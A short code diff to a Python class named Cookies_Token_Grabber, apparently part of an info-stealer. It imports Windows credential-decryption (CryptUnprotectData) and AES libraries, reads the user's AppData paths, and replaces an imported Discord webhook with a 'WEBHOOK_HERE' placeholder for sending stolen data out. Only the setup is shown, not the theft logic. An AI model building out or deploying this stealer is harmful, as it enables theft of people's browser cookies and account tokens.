@@ -7,7 +7,6 @@ import json
 import base64 
 import psutil 
 import pyautogui
-from webhook import discordwebhook
 
 from win32crypt import CryptUnprotectData
 from re import findall
@@ -15,7 +14,7 @@ from Crypto.Cipher import AES
 
 class Cookies_Token_Grabber:
     def __init__(self):
-        self.webhook = discordwebhook
+        self.webhook = "WEBHOOK_HERE"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
